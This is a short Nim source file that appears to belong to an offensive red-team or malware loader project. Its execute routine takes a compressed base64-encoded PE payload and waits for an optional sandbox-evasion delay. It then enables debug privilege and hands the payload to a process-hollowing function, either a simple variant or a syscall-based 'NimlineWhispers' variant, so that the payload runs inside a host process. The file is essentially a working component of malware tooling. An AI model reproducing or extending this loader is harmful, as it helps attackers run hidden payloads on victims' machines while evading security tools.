import winim/inc/windef
import utils
import os

when defined(hollowsimple):
    import hollowsimple
when defined(hollownimline):
    import hollowNimlineWhispers


proc execute*(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), sleepSeconds: int = 0): bool =

    # Sleep at execution
    sleep(sleepSeconds * 1000)

    # Enable dubug privilege
    discard setDebugPrivilege()
    
    # Execute module
    when defined(hollowsimple):
        return simpleHollow(compressedBase64PE, cast[LPCSTR](unsafeAddr sponsorCmd[0]))
    when defined(hollownimline):
        return nimlineHollow(compressedBase64PE, cast[LPCSTR](unsafeAddr sponsorCmd[0]))

